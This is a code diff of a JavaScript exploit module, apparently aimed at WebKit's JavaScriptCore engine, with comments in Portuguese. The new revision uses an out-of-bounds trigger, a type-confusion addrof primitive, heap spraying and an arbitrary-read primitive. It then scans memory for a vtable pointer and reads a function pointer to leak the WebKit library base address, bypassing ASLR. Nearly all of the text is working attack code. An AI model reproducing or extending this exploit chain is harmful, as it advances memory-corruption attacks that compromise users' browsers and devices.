@@ -1,24 +1,23 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v104 - R64 - Estratégia Final e Direta)
+// js/script3/testArrayBufferVictimCrash.mjs (v105 - R65 - Estratégia de Memory Scan)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Abandona as primitivas addrof/fakeobj instáveis para leitura/escrita.
-// Utiliza a primitiva arb_read confiável do core_exploit.mjs, que manipula
-// diretamente os metadados de um DataView, para realizar o vazamento do endereço base.
-// Esta abordagem é mais direta e elimina a fonte de instabilidade anterior.
+// Implementa uma varredura de memória (Memory Scan) em torno do endereço vazado por 'addrof'.
+// Em vez de assumir um offset fixo, o script agora procura ativamente por um ponteiro
+// que se pareça com uma V-Table, tornando a exploração muito mais resiliente a
+// mudanças na estrutura de memória do objeto.
 // =======================================================================================
 
-import { logS3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    arb_read, // Importa a primitiva de leitura direta e confiável
+    arb_read, 
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_DirectLeak_v104_R64_FINAL";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_MemScan_v105_R65";
 
 // --- Funções de Conversão (Double <-> Int64) ---
-// Apenas doubleToInt64 é necessário para a primitiva addrof inicial.
 function doubleToInt64(double) {
     const buf = new ArrayBuffer(8);
     (new Float64Array(buf))[0] = double;
@@ -27,11 +26,11 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (USANDO ESTRATÉGIA DIRETA)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (USANDO ESTRATÉGIA DE MEMORY SCAN)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Leitura Direta ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Memory Scan ---`, "test");
 
     let final_result = { 
         success: false, 
@@ -40,11 +39,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 
     try {
-        // --- FASE 1: Obter OOB e a primitiva addrof inicial ---
-        logS3("--- FASE 1: Obtendo OOB e 'addrof' inicial... ---", "subtest");
+        // --- FASE 1: Obter OOB e endereço de referência ---
+        logS3("--- FASE 1: Obtendo OOB e endereço de referência... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
 
-        // A primitiva addrof ainda é útil para obter um endereço inicial
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
         const addrof = (obj) => {
@@ -57,29 +55,51 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 2: Estabilizando Heap... ---", "subtest");
         const spray = [];
         for (let i = 0; i < 1000; i++) {
-            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
+            spray.push({ a: i, b: 0xCAFEBABE });
         }
         const test_obj = spray[500];
-        logS3("Spray de 1000 objetos concluído para estabilização.", "info");
+        const test_obj_addr_ref = addrof(test_obj);
+        logS3(`Endereço de referência obtido via addrof: ${test_obj_addr_ref.toString(true)}`, "info");
 
-        // --- FASE 3: Vazamento de Endereço Base com Leitura Direta ---
-        logS3("--- FASE 3: Vazando Endereço Base com Leitura Direta (arb_read)... ---", "subtest");
-            
-        const test_obj_addr = addrof(test_obj);
-        logS3(`Endereço do objeto de teste obtido via addrof: ${test_obj_addr.toString(true)}`, "info");
-            
-        // Usa a primitiva arb_read confiável para ler o ponteiro da V-Table no offset 0x0 do objeto.
-        const vtable_addr = await arb_read(test_obj_addr, 8);
-        logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "leak");
 
-        if (!vtable_addr || vtable_addr.high() === 0) {
-            throw new Error(`Ponteiro da V-Table lido (${vtable_addr.toString(true)}) parece inválido.`);
+        // --- FASE 3: Exploração de Memória para Encontrar a V-Table ---
+        logS3("--- FASE 3: Procurando V-Table na vizinhança do endereço de referência... ---", "subtest");
+        
+        const SEARCH_RANGE_BYTES = 0x200;
+        const start_addr = test_obj_addr_ref.sub(SEARCH_RANGE_BYTES);
+        const end_addr = test_obj_addr_ref.add(SEARCH_RANGE_BYTES);
+        let vtable_addr = null;
+        let actual_obj_addr = null;
+
+        for (let current_addr = start_addr; current_addr.low() < end_addr.low(); current_addr = current_addr.add(8)) {
+            const offset = current_addr.sub(test_obj_addr_ref);
+            const vtable_candidate = await arb_read(current_addr, 8);
+
+            // Validação Nível 1: O ponteiro lido parece um endereço válido?
+            if (vtable_candidate && vtable_candidate.high() > 0x10000) { // Verifica se não é nulo e se a parte alta parece um endereço
+                
+                // Validação Nível 2: O local para onde ele aponta também contém um ponteiro válido?
+                const first_func_ptr = await arb_read(vtable_candidate, 8);
+                if (first_func_ptr && first_func_ptr.high() > 0x10000) {
+                    logS3(`[SUCESSO] V-Table encontrada no offset ${offset.toString(true)}!`, "vuln");
+                    logS3(`   Endereço do Objeto Real: ${current_addr.toString(true)}`, "leak");
+                    logS3(`   Ponteiro da V-Table: ${vtable_candidate.toString(true)}`, "leak");
+                    vtable_addr = vtable_candidate;
+                    actual_obj_addr = current_addr;
+                    break; // Sai do loop ao encontrar o primeiro candidato forte
+                }
+            }
         }
 
+        if (!vtable_addr) {
+            throw new Error(`A V-Table não foi encontrada na faixa de busca de +/- ${SEARCH_RANGE_BYTES} bytes.`);
+        }
+        
+        // --- FASE 4: Calcular o Endereço Base do WebKit ---
+        logS3("--- FASE 4: Calculando o endereço base a partir da V-Table encontrada... ---", "subtest");
         const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
             
-        // Lê o endereço da função 'put' da V-Table usando arb_read.
         const put_func_addr = await arb_read(put_func_ptr_addr, 8);
         logS3(`Lido ponteiro da função put() de ${put_func_ptr_addr.toString(true)} -> ${put_func_addr.toString(true)}`, "leak");
             
@@ -94,7 +114,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             
         final_result = {
             success: true,
-            message: "Endereço base do WebKit vazado com sucesso usando a primitiva de leitura direta.",
+            message: `V-Table encontrada via Memory Scan. Endereço base do WebKit vazado com sucesso.`,
             webkit_base_address: webkit_base_addr.toString(true)
         };
 
@@ -114,7 +134,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             webkit_base_candidate: final_result.webkit_base_address
         },
         heisenbug_on_M2_in_best_result: final_result.success,
-        oob_value_of_best_result: 'N/A (Estratégia de Leitura Direta)',
-        tc_probe_details: { strategy: 'Uncaged Direct R/W Strategy' }
+        oob_value_of_best_result: 'N/A (Estratégia de Memory Scan)',
+        tc_probe_details: { strategy: 'Uncaged Memory Scan Strategy' }
     };
 }
